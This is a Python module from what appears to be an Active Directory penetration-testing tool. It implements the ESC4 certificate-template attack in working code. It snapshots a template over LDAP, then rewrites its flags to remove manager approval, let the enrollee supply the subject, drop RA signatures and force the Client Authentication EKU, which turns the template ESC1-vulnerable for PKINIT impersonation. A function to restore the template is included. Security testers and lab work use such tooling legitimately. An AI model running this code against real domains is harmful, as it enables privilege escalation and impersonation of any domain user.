"""Native ADCS template modification service.

Replaces ``certipy template -save`` / ``-write-default-configuration`` /
``-write-configuration`` subprocess calls with native LDAP writes via badldap.

Public entry points:
  * :func:`snapshot_template` — capture nTSecurityDescriptor + critical
    msPKI-* attributes for restore.
  * :func:`make_template_esc1_vulnerable` — clear manager-approval, set
    ENROLLEE_SUPPLIES_SUBJECT, drop RA-Signature, force ClientAuth EKU.
  * :func:`restore_template` — re-apply a snapshot dict.

The lab case ``adcs/goad_esc4`` exercises this exact attribute set
end-to-end against GOAD's ``ESC4`` template.
"""

from __future__ import annotations

import json
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any, Optional

from adscan_internal import telemetry
from adscan_core.rich_output import print_info_debug, print_warning
from adscan_internal.services.ldap_transport_service import (
    SD_FLAGS_DACL_CONTROL,
    ADscanLDAPConfig,
    ADscanLDAPConnection,
)
from adscan_core.rich_output import print_exception


# msPKI-Enrollment-Flag bit: manager-approval required.
_PEND_ALL_REQUESTS = 0x2
# msPKI-Certificate-Name-Flag bit: enrollee supplies SAN (the ESC1 lever).
_ENROLLEE_SUPPLIES_SUBJECT = 0x1
# Client Authentication EKU — what we replace pKIExtendedKeyUsage with so the
# resulting cert is usable for PKINIT.
_OID_CLIENT_AUTH = "1.3.6.1.5.5.7.3.2"


@dataclass
class TemplateSnapshot:
    """Serializable snapshot of every attribute the service mutates.

    Persist via ``to_json()`` so ESC4 callers can survive a process restart
    between mutation and restore (mirrors certipy v5's auto-saved JSON).
    """

    template_dn: str
    sd_b64: str  # base64 of nTSecurityDescriptor bytes
    enroll_flag: int
    name_flag: int
    ra_signature: int
    pki_eku: list[str]
    app_policy: list[str]

    @classmethod
    def from_json(cls, blob: str) -> "TemplateSnapshot":
        return cls(**json.loads(blob))

    def to_json(self) -> str:
        return json.dumps(asdict(self), indent=2)


def _build_ldap_config(
    *,
    domain: str,
    dc_ip: str,
    dc_fqdn: Optional[str],
    username: str,
    password: str,
) -> ADscanLDAPConfig:
    """LDAPS-by-default config for native template ACL/property writes."""
    return ADscanLDAPConfig(
        domain=domain,
        dc_ip=dc_ip,
        use_ldaps=True,
        use_kerberos=False,
        username=username,
        password=password,
        kerberos_target_hostname=dc_fqdn,
        auth_domain=domain,
        auth_kdc=dc_ip,
    )


def _b64encode(data: bytes) -> str:
    import base64

    return base64.b64encode(data).decode("ascii")


def _b64decode(data: str) -> bytes:
    import base64

    return base64.b64decode(data.encode("ascii"))


def snapshot_template(
    *,
    domain: str,
    dc_ip: str,
    username: str,
    password: str,
    template_name: str,
    dc_fqdn: Optional[str] = None,
) -> Optional[TemplateSnapshot]:
    """Snapshot every attribute we will mutate on the named template.

    Returns ``None`` when the template cannot be located or its security
    descriptor cannot be read (insufficient rights, signing/CB blocking,
    etc.) — callers must refuse to mutate without a snapshot.
    """
    cfg = _build_ldap_config(
        domain=domain,
        dc_ip=dc_ip,
        dc_fqdn=dc_fqdn,
        username=username,
        password=password,
    )
    try:
        with ADscanLDAPConnection(cfg) as conn:
            templates_container = (
                f"CN=Certificate Templates,CN=Public Key Services,"
                f"CN=Services,{conn.config_dn}"
            )
            conn.search(
                search_base=templates_container,
                search_filter=(
                    f"(&(objectClass=pKICertificateTemplate)"
                    f"(|(cn={template_name})(name={template_name})))"
                ),
                attributes=["distinguishedName"],
            )
            if not conn.entries:
                return None
            template_dn = conn.entries[0].dn

            conn.search(
                search_base=template_dn,
                search_filter="(objectClass=*)",
                attributes=["nTSecurityDescriptor"],
                search_scope="BASE",
                controls=SD_FLAGS_DACL_CONTROL,
            )
            if not conn.entries:
                return None
            raw_sd = (
                conn.entries[0].entry_raw_attributes.get("nTSecurityDescriptor") or []
            )
            if not raw_sd or not isinstance(raw_sd[0], bytes):
                return None

            attrs_wanted = [
                "msPKI-Enrollment-Flag",
                "msPKI-Certificate-Name-Flag",
                "msPKI-RA-Signature",
                "pKIExtendedKeyUsage",
                "msPKI-Certificate-Application-Policy",
            ]
            conn.search(
                search_base=template_dn,
                search_filter="(objectClass=*)",
                attributes=attrs_wanted,
                search_scope="BASE",
            )
            attrs = (
                conn.entries[0].entry_attributes_as_dict
                if conn.entries
                else {}
            )

            def _first_int(name: str, default: int = 0) -> int:
                values = attrs.get(name) or [default]
                try:
                    return int(values[0])
                except (TypeError, ValueError):
                    return default

            return TemplateSnapshot(
                template_dn=template_dn,
                sd_b64=_b64encode(raw_sd[0]),
                enroll_flag=_first_int("msPKI-Enrollment-Flag"),
                name_flag=_first_int("msPKI-Certificate-Name-Flag"),
                ra_signature=_first_int("msPKI-RA-Signature"),
                pki_eku=[str(v) for v in (attrs.get("pKIExtendedKeyUsage") or [])],
                app_policy=[
                    str(v)
                    for v in (attrs.get("msPKI-Certificate-Application-Policy") or [])
                ],
            )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        print_warning(f"[template] Snapshot failed: {type(exc).__name__}: {exc}")
        return None


def make_template_esc1_vulnerable(
    *,
    domain: str,
    dc_ip: str,
    username: str,
    password: str,
    snapshot: TemplateSnapshot,
    dc_fqdn: Optional[str] = None,
) -> tuple[bool, Optional[str]]:
    """Mutate the snapshotted template into an ESC1-style configuration.

    The write is attempted as ``username`` — exercises that user's
    WriteProperty rights on the template object (the real ESC4 condition).
    Returns ``(ok, error)``; ``error`` is ``None`` on success.
    """
    new_enroll = snapshot.enroll_flag & ~_PEND_ALL_REQUESTS
    new_name = snapshot.name_flag | _ENROLLEE_SUPPLIES_SUBJECT
    cfg = _build_ldap_config(
        domain=domain,
        dc_ip=dc_ip,
        dc_fqdn=dc_fqdn,
        username=username,
        password=password,
    )
    try:
        with ADscanLDAPConnection(cfg) as conn:
            ok = conn.modify(
                snapshot.template_dn,
                {
                    "msPKI-Enrollment-Flag": [("replace", [str(new_enroll)])],
                    "msPKI-Certificate-Name-Flag": [("replace", [str(new_name)])],
                    "msPKI-RA-Signature": [("replace", ["0"])],
                    "pKIExtendedKeyUsage": [("replace", [_OID_CLIENT_AUTH])],
                    "msPKI-Certificate-Application-Policy": [
                        ("replace", [_OID_CLIENT_AUTH])
                    ],
                },
            )
            if not ok:
                return False, "LDAP modify (template flags) returned false."
        print_info_debug(
            f"[template] {snapshot.template_dn} relaxed: "
            f"enroll {snapshot.enroll_flag}->{new_enroll}, "
            f"name {snapshot.name_flag}->{new_name}, "
            f"RA-Signature ->0, EKU -> ClientAuth"
        )
        return True, None
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return False, f"{type(exc).__name__}: {exc}"


def restore_template(
    *,
    domain: str,
    dc_ip: str,
    username: str,
    password: str,
    snapshot: TemplateSnapshot,
    dc_fqdn: Optional[str] = None,
) -> tuple[bool, Optional[str]]:
    """Restore every attribute we mutated to the snapshot values.

    Includes nTSecurityDescriptor restore so any DACL changes (e.g. an
    Enroll right we granted as part of an ESC4 chain) are also rolled back.
    """
    cfg = _build_ldap_config(
        domain=domain,
        dc_ip=dc_ip,
        dc_fqdn=dc_fqdn,
        username=username,
        password=password,
    )
    errors: list[str] = []
    try:
        with ADscanLDAPConnection(cfg) as conn:
            # Attributes first (cheap if they're already correct).
            attr_payload: dict[str, Any] = {
                "msPKI-Enrollment-Flag": [("replace", [str(snapshot.enroll_flag)])],
                "msPKI-Certificate-Name-Flag": [
                    ("replace", [str(snapshot.name_flag)])
                ],
                "msPKI-RA-Signature": [("replace", [str(snapshot.ra_signature)])],
            }
            if snapshot.pki_eku:
                attr_payload["pKIExtendedKeyUsage"] = [
                    ("replace", list(snapshot.pki_eku))
                ]
            if snapshot.app_policy:
                attr_payload["msPKI-Certificate-Application-Policy"] = [
                    ("replace", list(snapshot.app_policy))
                ]
            ok_attrs = conn.modify(snapshot.template_dn, attr_payload)
            if not ok_attrs:
                errors.append("LDAP modify (attributes) returned false.")

            # Security descriptor — replace verbatim from the snapshot.
            sd_bytes = _b64decode(snapshot.sd_b64)
            ok_sd = conn.modify(
                snapshot.template_dn,
                {"nTSecurityDescriptor": [("replace", sd_bytes)]},
                encode=False,
                controls=SD_FLAGS_DACL_CONTROL,
            )
            if not ok_sd:
                errors.append("LDAP modify (security descriptor) returned false.")
        if errors:
            return False, "; ".join(errors)
        return True, None
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return False, f"{type(exc).__name__}: {exc}"


def write_snapshot_to_disk(snapshot: TemplateSnapshot, dest: Path) -> None:
    """Persist a snapshot to ``dest`` (used by ESC4 CLI for crash-safe restore)."""
    dest.write_text(snapshot.to_json(), encoding="utf-8")


def read_snapshot_from_disk(src: Path) -> TemplateSnapshot:
    return TemplateSnapshot.from_json(src.read_text(encoding="utf-8"))


__all__ = [
    "TemplateSnapshot",
    "snapshot_template",
    "make_template_esc1_vulnerable",
    "restore_template",
    "write_snapshot_to_disk",
    "read_snapshot_from_disk",
]
